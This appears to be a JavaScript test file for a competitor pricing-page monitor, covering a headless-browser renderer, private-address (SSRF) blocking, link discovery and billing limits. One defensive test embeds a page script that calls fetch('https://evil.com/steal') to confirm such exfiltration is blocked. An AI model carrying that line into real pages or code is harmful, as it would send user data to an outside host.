import test from 'node:test';
import assert from 'node:assert/strict';
import {createBrowserRenderer,createRouteGuard} from '../lib/intelligenceBrowser.js';
import {scoreLink,rankCandidates,anchorsFromHtml,locsFromSitemap,normalizeCompetitor,discoverPages} from '../lib/intelligenceDiscover.js';
import {runActor} from '../actors/intelligence/runtime.js';
import {createHash} from 'node:crypto';

const publicResolver=async()=>[{address:'93.184.216.34',family:4}];
const privateResolver=async host=>[{address:host==='evil.com'?'10.0.0.5':'93.184.216.34',family:4}];
let chromium;try{({chromium}=await import('playwright'));}catch{}

test('route guard allows public HTTPS only and caches decisions',async()=>{
  let lookups=0;const guard=createRouteGuard({resolver:async host=>{lookups++;return privateResolver(host);}});
  assert.equal(await guard('https://public.com/a'),true);assert.equal(await guard('https://public.com/b'),true);assert.equal(lookups,1);
  for(const bad of ['http://public.com/','https://evil.com/','https://127.0.0.1/','https://public.com:8443/','https://user:pw@public.com/','ftp://public.com/','not a url','https://localhost/'])assert.equal(await guard(bad),false,bad);
  assert.equal(await guard('data:text/plain,hi'),true);
});
test('browser renders JavaScript-built pricing text and applies the same cleanup',{skip:!chromium},async()=>{
  const page=`<html><head><title>Plans | Acme</title></head><body><nav>Home Pricing Login</nav><div id=root></div>
    <script>setTimeout(()=>{document.getElementById('root').innerHTML='<h1>Simple pricing</h1><p>Starter $39 per month</p><p>Team $99 per month</p><p>Cancel anytime, no contracts.</p>'},100)</script><footer>Copyright</footer></body></html>`;
  const renderer=createBrowserRenderer({launch:()=>chromium.launch({headless:true,args:['--no-sandbox']}),resolver:publicResolver,fulfill:async url=>url.startsWith('https://acme.com/')?{body:page}:undefined});
  try{
    const result=await renderer.render('https://acme.com/pricing');
    assert.equal(result.captureMethod,'browser');assert.equal(result.title,'Plans | Acme');assert.match(result.text,/Starter \$39 per month/);assert.match(result.text,/Team \$99 per month/);
    assert.doesNotMatch(result.text,/Copyright|Home Pricing Login/);assert.equal(result.hash,createHash('sha256').update(result.text).digest('hex'));
    const {links}=await renderer.links('https://acme.com/pricing');assert.ok(Array.isArray(links));
  }finally{await renderer.close();}
});
test('browser refuses private addresses, challenge pages and HTTP errors without leaking details',{skip:!chromium},async()=>{
  const renderer=createBrowserRenderer({launch:()=>chromium.launch({headless:true,args:['--no-sandbox']}),resolver:privateResolver,
    fulfill:async url=>url.includes('challenge')?{body:'<title>Just a moment</title><body>Checking your browser before accessing the site. Enable JavaScript and cookies to continue and wait a moment please thanks</body>'}:url.includes('missing')?{status:404,body:'nope'}:undefined});
  try{
    await assert.rejects(renderer.render('https://evil.com/'),{code:'PRIVATE_ADDRESS'});
    await assert.rejects(renderer.render('https://good.com/challenge'),{code:'BROWSER_REQUIRED'});
    await assert.rejects(renderer.render('https://good.com/missing'),{code:'HTTP_ERROR'});
    await assert.rejects(renderer.render('http://good.com/'),{code:'INVALID_URL'});
  }finally{await renderer.close();}
});
test('browser blocks sub-requests to private hosts',{skip:!chromium},async()=>{
  const seen=[];const page='<title>Plans page</title><body><p>Pricing plans start at $10 per month for everyone who signs up today.</p><script>fetch("https://evil.com/steal").then(()=>document.body.append("LEAKED")).catch(()=>document.body.append(" blocked-ok"))</script></body>';
  const renderer=createBrowserRenderer({launch:()=>chromium.launch({headless:true,args:['--no-sandbox']}),resolver:privateResolver,fulfill:async url=>{seen.push(url);return url.startsWith('https://good.com/')?{body:page}:{body:'secret'};}});
  try{const result=await renderer.render('https://good.com/');assert.doesNotMatch(result.text,/LEAKED/);assert.match(result.text,/blocked-ok/);assert.ok(!seen.some(u=>u.includes('evil.com')));}finally{await renderer.close();}
});

test('link scoring favors pricing and plans, ignores blog, login and files',()=>{
  assert.ok(scoreLink('https://acme.com/pricing','Pricing')>scoreLink('https://acme.com/services','Services'));
  for(const bad of ['https://acme.com/blog/pricing-guide','https://acme.com/login','https://acme.com/brochure/pricing.pdf','https://acme.com/','http://acme.com/pricing','https://acme.com/about-us'])assert.equal(scoreLink(bad,'Pricing'),0,bad);
  assert.ok(scoreLink('https://acme.com/p/x','See our plans')>0);
});
test('ranking keeps same-site pages, drops duplicates and off-site links',()=>{
  const ranked=rankCandidates('https://acme.com',[{href:'/pricing',text:'Pricing',source:'link'},{href:'https://www.acme.com/pricing/?utm=1',text:'Plans',source:'link'},{href:'https://other.com/pricing',text:'x',source:'link'},{href:'https://app.acme.com/plans',text:'',source:'link'},{href:'/blog/news',text:'',source:'link'}]);
  assert.deepEqual(ranked.map(r=>new URL(r.url).host+new URL(r.url).pathname).sort(),['acme.com/pricing','app.acme.com/plans']);
  assert.equal(ranked.length,2);assert.ok(ranked.every(r=>!r.url.includes('other.com')&&!r.url.includes('?')));
});
test('anchors and sitemap parsing',()=>{
  assert.deepEqual(anchorsFromHtml(`<a class="x" href="/pricing">Our <b>Pricing</b></a><a href='/plans'>Plans</a><a name=x>no href</a>`),[{href:'/pricing',text:'Our Pricing'},{href:'/plans',text:'Plans'}]);
  assert.deepEqual(locsFromSitemap('<urlset><url><loc> https://a.com/pricing </loc></url></urlset>'),['https://a.com/pricing']);
  assert.deepEqual(locsFromSitemap('<sitemapindex><sitemap><loc>https://a.com/s1.xml</loc></sitemap></sitemapindex>'),[]);
});
test('competitor addresses normalize to a public origin and bad ones fail',()=>{
  assert.equal(normalizeCompetitor('Acme.com'),'https://acme.com');assert.equal(normalizeCompetitor('https://www.acme.com/pricing?x=1'),'https://www.acme.com');
  for(const bad of ['','localhost','http://10.0.0.1','foo','   ',5])assert.throws(()=>normalizeCompetitor(bad));
});
test('discovery uses homepage links, then sitemap, then verified guesses, and never invents pages',async()=>{
  const pages={'https://acme.com/':'<a href="/pricing">Pricing</a><a href="/blog/x">Blog</a><a href="/services">Services</a>','https://acme.com/sitemap.xml':'<urlset><url><loc>https://acme.com/plans</loc></url></urlset>'};
  const fetchHtml=async url=>{if(!(url in pages))throw Object.assign(new Error('x'),{code:'HTTP_ERROR'});return{url,html:pages[url]};};
  const found=await discoverPages('https://acme.com',{fetchHtml,perSite:2});
  assert.deepEqual(found.map(p=>p.url),['https://acme.com/pricing','https://acme.com/plans']);
  const bare=await discoverPages('https://empty.com',{fetchHtml:async url=>{if(url==='https://empty.com/')return{url,html:'<a href="/about">About</a>'};throw Error('no');}});
  assert.deepEqual(bare,[]);
  const guessed=await discoverPages('https://g.com',{fetchHtml:async url=>{if(url==='https://g.com/plans')return{url,html:'x'};if(url==='https://g.com/pricing')return{url:'https://g.com/',html:'x'};throw Error('no');}});
  assert.deepEqual(guessed.map(p=>[p.url,p.source]),[['https://g.com/plans','guess']]);
});
test('discovery falls back to the browser for script-built navigation',async()=>{
  const found=await discoverPages('https://spa.com',{fetchHtml:async url=>{if(url==='https://spa.com/')return{url,html:'<div id=app></div>'};throw Error('no');},links:async()=>({links:[{href:'https://spa.com/pricing',text:'Pricing'}]})});
  assert.deepEqual(found.map(p=>p.url),['https://spa.com/pricing']);
});

const snap=(text,method='public-html',url='https://acme.com/pricing')=>({url,title:'Plans',text,capturedAt:'2026-10-22T12:00:00.000Z',hash:createHash('sha256').update(text).digest('hex'),captureMethod:method});
const fakeActor=(input,{kv=new Map(),rows=[],limits={}}={})=>({openKeyValueStore:async()=>({getValue:async k=>kv.get(k),setValue:async(k,v)=>kv.set(k,v)}),getInput:async()=>input,
  getChargingManager:()=>({calculateMaxEventChargeCountWithinLimit:event=>limits[event]??10}),pushData:async(...a)=>{rows.push(a);if(a[1]&&limits[a[1]]!==undefined)limits[a[1]]--;},setValue:async()=>{},setStatusMessage:async()=>{}});
test('competitor domains become watched pages, tagged with where they came from',async()=>{
  const rows=[];const fetchHtml=async url=>{if(url==='https://acme.com/')return{url,html:'<a href="/pricing">Pricing</a>'};throw Error('no');};
  const summary=await runActor(fakeActor({competitors:['acme.com','nothing.com'],urls:['https://public.com/x']},{rows}),{fetchHtml,capture:async url=>snap('Starter\n$39 per month','public-html',url)});
  const byUrl=Object.fromEntries(rows.map(r=>[r[0].requestedUrl,r[0]]));
  assert.equal(byUrl['https://acme.com/pricing'].competitor,'acme.com');assert.equal(byUrl['https://acme.com/pricing'].discoveredFrom,'link');
  assert.equal(byUrl['https://public.com/x'].competitor,undefined);
  const gap=byUrl['https://nothing.com/'];assert.equal(gap.error.code,'NO_PAGES_FOUND');assert.equal(rows.find(r=>r[0]===gap).length,1);
  assert.equal(summary.successful,2);assert.deepEqual(summary.competitorsWithoutPages,['nothing.com']);
});
test('auto mode falls back to the browser only when the page needs one, and bills the browser event',async()=>{
  const rows=[];let renders=0;const renderer={render:async url=>{renders++;return snap('Starter\n$39 per month','browser',url);},links:async()=>({links:[]}),close:async()=>{}};
  await runActor(fakeActor({urls:['https://acme.com/pricing','https://plain.com/pricing']},{rows}),{renderer,capture:async url=>{if(url.includes('acme'))throw Object.assign(new Error('js'),{code:'BROWSER_REQUIRED'});return snap('Plain\n$10 per month','public-html',url);}});
  assert.equal(renders,1);const acme=rows.find(r=>r[0].requestedUrl.includes('acme')),plain=rows.find(r=>r[0].requestedUrl.includes('plain'));
  assert.equal(acme[1],'browser-page-result');assert.equal(acme[0].captureMethod,'browser');assert.equal(plain[1],'page-result');
});
test('auto mode does not use the browser when its event is out of budget; html mode never does',async()=>{
  const rows=[];let renders=0;const renderer={render:async()=>{renders++;},links:async()=>({links:[]}),close:async()=>{}};
  const blocked=async()=>{throw Object.assign(new Error('js'),{code:'BROWSER_REQUIRED'});};
  await runActor(fakeActor({urls:['https://acme.com/p']},{rows,limits:{'browser-page-result':0}}),{renderer,capture:blocked});
  await runActor(fakeActor({urls:['https://acme.com/p'],renderMode:'html'},{rows}),{renderer,capture:blocked});
  assert.equal(renders,0);assert.equal(rows.every(r=>r[0].status==='failed'&&r.length===1),true);
});
test('browser mode renders every page and checks the browser budget first',async()=>{
  const rows=[];let renders=0;const renderer={render:async url=>{renders++;return snap('Starter\n$39 per month','browser',url);},links:async()=>({links:[]}),close:async()=>{}};
  await runActor(fakeActor({urls:['https://a.com/p','https://b.com/p'],renderMode:'browser'},{rows,limits:{'browser-page-result':1,'page-result':0}}),{renderer,capture:async()=>{throw Error('html must not run');}});
  assert.equal(renders,1);assert.equal(rows.length,1);assert.equal(rows[0][1],'browser-page-result');
});
test('switching capture method starts a fresh baseline instead of inventing changes',async()=>{
  const kv=new Map(),rows=[];const input={urls:['https://acme.com/pricing']};
  await runActor(fakeActor(input,{kv,rows}),{capture:async()=>snap('Starter\n$39 per month','public-html')});
  await runActor(fakeActor({...input,renderMode:'browser'},{kv,rows}),{renderer:{render:async()=>snap('Totally different browser text\n$39 per month','browser'),close:async()=>{}}});
  assert.equal(rows[1][0].comparison,'baseline');assert.equal(rows[1][0].baselineReset,true);
  await runActor(fakeActor({...input,renderMode:'browser'},{kv,rows}),{renderer:{render:async()=>snap('Totally different browser text\n$49 per month','browser'),close:async()=>{}}});
  assert.equal(rows[2][0].comparison,'changed');assert.equal(rows[2][0].baselineReset,undefined);
});
test('input validation for competitors and render mode',async()=>{
  const {validateIntelligenceInput}=await import('../lib/intelligenceBatch.js');
  assert.throws(()=>validateIntelligenceInput({}));assert.throws(()=>validateIntelligenceInput({competitors:['localhost']}));
  assert.throws(()=>validateIntelligenceInput({competitors:['acme.com'],pagesPerCompetitor:6}));assert.throws(()=>validateIntelligenceInput({urls:['https://a.com'],renderMode:'chrome'}));
  assert.throws(()=>validateIntelligenceInput({competitors:Array.from({length:21},(_,i)=>`c${i}.com`)}));
  const plan=validateIntelligenceInput({competitors:['Acme.com','https://acme.com/x']});assert.deepEqual(plan.competitors,['https://acme.com']);assert.equal(plan.renderMode,'auto');assert.equal(plan.urls.length,0);
});
